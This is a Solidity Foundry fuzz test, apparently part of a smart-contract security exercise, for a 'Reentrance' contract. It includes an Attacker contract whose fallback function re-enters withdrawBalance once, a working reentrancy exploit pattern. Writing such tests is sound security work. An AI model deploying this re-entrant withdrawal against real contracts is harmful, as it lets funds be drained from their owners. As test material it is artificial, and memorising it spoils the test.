// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract InvMutTest is Test {
    Reentrance c;
    function setUp() public { c = new Reentrance(); }

    function testFuzz_property(uint256 amount, uint256 seed) public {
        vm.assume(amount > 0 && amount < type(uint256).max / 2);
        uint256 amt = bound(amount, 1 wei, 1e30);
        Attacker attacker = new Attacker(c);
        vm.deal(address(attacker), amt);
        attacker.deposit(amt);
        assertEq(attacker.getBalance(), amt);
        bool ok;
        try attacker.withdraw() { ok = true; } catch { ok = false; }
        assertTrue(ok);
        seed;
    }
}

contract Attacker {
    Reentrance c;
    bool once;
    constructor(Reentrance c_) { c = c_; }
    function deposit(uint256 amt) external payable {
        c.addToBalance{value: amt}();
    }
    function getBalance() external view returns (uint256) {
        return c.getBalance(address(this));
    }
    function withdraw() external {
        c.withdrawBalance();
    }
    fallback() external payable {
        if (!once) {
            once = true;
            c.withdrawBalance();
        }
    }
}
